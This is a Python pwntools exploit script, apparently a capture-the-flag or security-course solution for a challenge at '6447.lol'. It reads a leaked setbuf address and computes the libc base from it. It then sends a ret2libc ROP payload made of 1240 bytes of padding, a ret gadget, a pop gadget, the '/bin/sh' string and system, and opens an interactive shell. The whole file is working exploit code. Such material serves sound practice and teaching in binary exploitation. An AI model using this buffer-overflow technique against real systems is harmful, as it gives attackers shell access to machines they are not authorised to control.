#!/usr/bin/env python3

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 7002

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
set follow-fork-mode parent
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E, LIBC
    
    # with context.local(log_level='error'):
    if args.REMOTE:
        P = remote(HOST, PORT)
    elif args.GDB:
        P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
    else:
        P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")
    # LIBC = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    # LIBC = ELF('./libc_2.18.so')
    LIBC = ELF('./libc_2.39.so')
    # LIBC = ELF('/lib/i386-linux-gnu/libc-2.36-18.fc37.i686')

######################################
############## Exploit ###############
######################################

def exploit():
    P.recvuntil(b'- ',drop=True)
    setbuf_leak = P.recvline()
    setbuf_leak = setbuf_leak[:-3]
    setbuf_leak = int(setbuf_leak, 16)
    log.info(f"setbuf is at: {hex(setbuf_leak)}")
    P.recvline()

    setbuf_offset = LIBC.symbols["setbuf"]
    LIBC.address = setbuf_leak - setbuf_offset
    log.info(f"base libc address: {hex(LIBC.address)}")

    libc_system = LIBC.symbols["system"]
    log.info(f"libc_system: {hex(libc_system)}")
    libc_binsh = next(LIBC.search(b'/bin/sh\00'))

    POP =  0x000000000010f75b # 2.39 - 0x000000000010f75b # LOCAL - 0x000000000002a3e5
    RET =  0x0000000000116ef6 # 2.39 - 0x0000000000116ef6 # LOCAL - 0x00000000000f8c92
    payload = b"A" * 1240
    payload += p64(LIBC.address + RET)
    payload += p64(LIBC.address + POP)
    payload += p64(libc_binsh)
    payload += p64(libc_system)
    
    P.sendline(payload)
    P.interactive()

if __name__ == '__main__':
    connect_binary()
    exploit()
